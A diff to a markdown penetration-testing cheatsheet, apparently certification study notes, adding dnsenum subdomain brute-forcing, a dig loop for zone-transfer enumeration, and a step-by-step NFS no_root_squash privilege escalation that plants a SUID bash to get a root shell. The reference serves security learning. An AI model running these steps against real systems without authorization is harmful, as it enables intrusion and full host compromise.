@@ -36,6 +36,8 @@
     - `2.4.1` Nmap NSE --script vuln
   - `2.5` **DNS Enumeration**
     - `2.5.1` dig version.bind CHAOS TXT
+    - `2.5.3` dnsenum subdomain brute force
+    - `2.5.4` dig recursive zone enumeration
 - `3` **Initial Attack Vectors**
   - `3.1` **LLMNR/NBT-NS Poisoning**
     - `3.1.1` Responder hash capture
@@ -110,6 +112,7 @@
     - `8.2.6` SSH keys
     - `8.2.7` Writable PATH directories
     - `8.2.8` Installed software
+    - `8.2.9` NFS no_root_squash privilege escalation
   - `8.3` **Useful Resources
 
 ## 1. Host Discovery
@@ -685,6 +688,64 @@ dig @<TARGET_IP> version.bind CHAOS TXT
 ```bash
 sudo nmap <TARGET_IP> -p 53 -sU -sV -Pn -n
 ```
+
+</details>
+
+#### 2.5.3 dnsenum subdomain brute force
+
+```bash
+dnsenum --dnsserver <TARGET_IP> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <DOMAIN>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Automated DNS enumeration: resolves host addresses, name servers, MX records, attempts zone transfers (AXFR), and brute-forces subdomains.
+- Performs the same class of brute-force queries as a manual `dig` loop, in one command.
+
+**Parameters**
+
+- `--dnsserver <TARGET_IP>` — DNS server to query.
+- `--enum` — Run all enumeration functions.
+- `-p 0` — Skip TCP port scanning (scans 0 ports).
+- `-s 0` — Skip reverse DNS lookups for subdomains.
+- `-o subdomains.txt` — Write results to a file.
+- `-f <WORDLIST>` — Subdomain wordlist to brute-force with.
+- `<DOMAIN>` — Base domain.
+
+**Recommended wordlists**
+
+| Wordlist | Characteristics |
+|---|---|
+| `subdomains-top1million-110000.txt` | Real-world subdomains ranked by popularity (www, api, blog, dev, mail). Good general coverage. |
+| `fierce-hostlist.txt` | Curated list heavy on internal/AD-style hostnames (win2k, dc1, wsus, exchange) often absent from popularity lists. Run as a second pass — different lists hit different names. |
+
+</details>
+
+#### 2.5.4 dig recursive zone enumeration
+
+```bash
+for sub in <SUBDOMAIN_LIST>; do echo "=== $sub.<DOMAIN> ==="; for type in AXFR TXT A SOA ANY; do dig @<DNS_IP> "$sub.<DOMAIN>" "$type" +noall +answer; done; done
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Any discovered subdomain can itself be a zone with its own NS, SOA, AXFR, and hidden subdomains. This loops through the list and queries every record type against each name.
+- Collect the newly surfaced hosts from the output, append them to the list, and **run the loop again** — repeat until no new names appear.
+- Single queries (A/TXT/ANY) may return empty for a zone while AXFR dumps everything intact, so AXFR is the priority.
+
+**Parameters**
+
+- `+noall` — Suppresses all dig output sections (header, comments, statistics).
+- `+answer` — Re-enables only the answer section, showing just the resolved records.
+- `<DNS_IP>` — DNS server to query.
+- `<DOMAIN>` — Base domain.
+- `<SUBDOMAIN_LIST>` — Space-separated subdomain names. Start with the base domain and any hits from the AXFR or `2.5.3` brute-force. After each pass, add every newly discovered name and re-run.
 
 </details>
 
@@ -2230,6 +2291,62 @@ dpkg -l 2>/dev/null || rpm -qa
 
 </details>
 
+#### 8.2.9 NFS no_root_squash privilege escalation
+
+**1. Find NFS shares and check for `no_root_squash`:**
+
+```bash
+showmount -e <TARGET_IP>
+rpcinfo -p <TARGET_IP>
+```
+
+Confirm the export flags (`root_squash` vs `no_root_squash`) via the server's `/etc/exports` if readable, or the `nfs-showmount` NSE output.
+
+**2. Mount the share on the attacker box:**
+
+```bash
+mkdir -p /tmp/pe
+sudo mount -t nfs <TARGET_IP>:<SHARE> /tmp/pe
+```
+
+**3. Drop a SUID bash onto the share (as root, requires `no_root_squash`):**
+
+```bash
+cd /tmp/pe
+cp /bin/bash .
+chmod +s bash
+```
+
+**4. Execute from the victim box (e.g. your SSH session):**
+
+```bash
+cd <mounted_share>
+./bash -p
+```
+
+`-p` keeps the elevated (SUID) privileges, giving a root shell.
+
+**5. Escalating to a specific user when `root_squash` IS set:** NFS trusts the client-claimed UID. Create a local user matching the target's UID, mount + SUID a binary as that user, then run it from the victim session to gain that user's rights.
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- `no_root_squash` lets remote root keep uid 0 on the share, so root-created files are root-owned and can carry the SUID bit.
+- With the default `root_squash`, root is squashed to `nobody`, but any *other* claimed UID is still trusted — impersonate a user by matching UIDs client-side.
+- The SUID bit and ownership are preserved over NFS, so the planted binary runs as its owner from the victim's mount.
+
+**Parameters**
+
+- `<TARGET_IP>` — NFS server IP.
+- `<SHARE>` — Exported share path (e.g. `/var/nfs`).
+- `-p` — bash flag to preserve the SUID euid.
+
+**Reference:** [HackTricks — NFS No Root Squash Misconfiguration Privilege Escalation](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md)
+
+</details>
+
 ### 8.3 Useful Resources
 
 | Resource | Purpose |
@@ -2242,3 +2359,5 @@ dpkg -l 2>/dev/null || rpm -qa
 | [Shodan](https://www.shodan.io/) | Search engine for internet-connected devices, exposed services, and banners |
 | [crt.sh](https://crt.sh/) | Certificate Transparency log search for passive subdomain discovery |
 | [GrayHatWarfare](https://grayhatwarfare.com/) | Search engine for exposed AWS, Azure, and GCP cloud storage buckets; sort/filter by file format |
+| [PJPT Notes](https://github.com/G0urmetD/PJPT-Notes) | TCM Security PJPT course notes — AD, pentest methodology, privesc |
+| [CPTS Cheatsheet](https://github.com/zagnox/CPTS-cheatsheet) | HTB CPTS exam cheatsheet |
